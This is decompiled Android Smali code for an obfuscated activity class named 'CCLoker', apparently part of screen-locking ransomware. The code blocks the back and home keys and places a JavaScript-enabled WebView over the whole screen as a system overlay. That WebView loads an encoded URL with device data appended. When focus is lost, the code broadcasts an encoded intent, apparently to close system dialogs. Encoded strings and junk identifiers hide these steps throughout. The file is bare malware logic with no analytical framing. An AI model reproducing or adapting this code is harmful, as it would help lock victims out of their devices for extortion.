.class public Lcompse/refact/st/upsssss/CCLoker$mainActivity;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field private sdfsdfsdfsdf:Landroid/view/View;

.field private zxcvxvsdvsvsvs:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    const v0, 0x7f040003

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->setContentView(I)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->stopService(Landroid/content/Intent;)Z

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/Notification;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method public onKeyUp(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->finish()V

    return-void
.end method

.method protected onStart()V
    .locals 4

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "\u0015U\u000c"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const v0, 0x7f080005

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x0

    invoke-virtual {v2, v3, v1}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "7L\u001aM\u0012G\u001c\u00068j7F\u0010L\t\u0006DYF"

    invoke-static {v2}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v2, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v1}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iget-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->sdfsdfsdfsdf:Landroid/view/View;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->sdfsdfsdfsdf:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v0

    check-cast v0, Landroid/view/ViewGroup;

    iget-object v2, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->sdfsdfsdfsdf:Landroid/view/View;

    invoke-virtual {v0, v2}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    const/16 v0, 0x7da

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->type:I

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "p)i$h7"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v2, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->sdfsdfsdfsdf:Landroid/view/View;

    invoke-interface {v0, v2, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->zxcvxvsdvsvsvs:Landroid/webkit/WebView;

    new-instance v1, Lcompse/refact/st/upsssss/ertertetetetete;

    invoke-direct {v1, p0}, Lcompse/refact/st/upsssss/ertertetetetete;-><init>(Lcompse/refact/st/upsssss/CCLoker$mainActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    return-void
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->finish()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-nez p1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v1, "H\u0015M\tF\u0012MU@\u0015]\u001eG\u000f\u0007\u001aJ\u000f@\u0014GUj7f(l$z\"z/l6v?`:e4n("

    invoke-static {v1}, Lcompse/refact/st/upsssss/uiiliuluiiuluilulu;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->sendBroadcast(Landroid/content/Intent;)V

    :cond_0
    return-void
.end method
